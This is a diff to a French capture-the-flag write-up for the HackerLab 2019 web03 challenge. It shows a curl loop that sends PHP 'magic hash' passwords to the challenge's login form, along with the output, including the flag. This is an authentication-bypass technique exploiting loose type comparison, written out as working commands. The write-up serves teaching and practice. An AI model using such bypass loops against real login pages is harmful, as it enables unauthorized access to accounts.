@@ -39,9 +39,13 @@ Cette chaîne obtenue représente donc notre ```login``` pour le formulaire de l
 
 Nous allons donc essayer ses différents **“Magic” Number / String** comme ```password``` pour voir le résultat.
 ```console 
-root@Y3HW3_Hack3r:~/HackerLab2019# curl -X POST http://hackerlab.bj:8001/web03/loginform.php --data "username=amazone&password=240610708"
-Flag: CTF_NOMDEHACKERCEQUETUESFORT
+root@Y3HW3_Hack3r:~/HackerLab2019# for i in {"240610708","10932435112","10885164793773","34250003024812","34250003024812"}; do curl -X POST http://hackerlab.bj:8001/web03/loginform.php --data "username=amazone&password=$i"; echo " -- "; done
+Flag: CTF_NOMDEHACKERCEQUETUESFORT -- 
+Essaie encore. Une cyber-amazone n'abandonne jamais! -- 
+Essaie encore. Une cyber-amazone n'abandonne jamais! -- 
+Essaie encore. Une cyber-amazone n'abandonne jamais! -- 
+Essaie encore. Une cyber-amazone n'abandonne jamais! -- 
 ```
-En testant le premier **“Magic” Number / String** ( **240610708** ) comme ```password```, on obtient notre ```flag```.
+<!-- En testant le premier **“Magic” Number / String** ( **240610708** ) comme ```password```, on obtient notre ```flag```. -->
 
 ```Flag ```: **CTF_NOMDEHACKERCEQUETUESFORT**
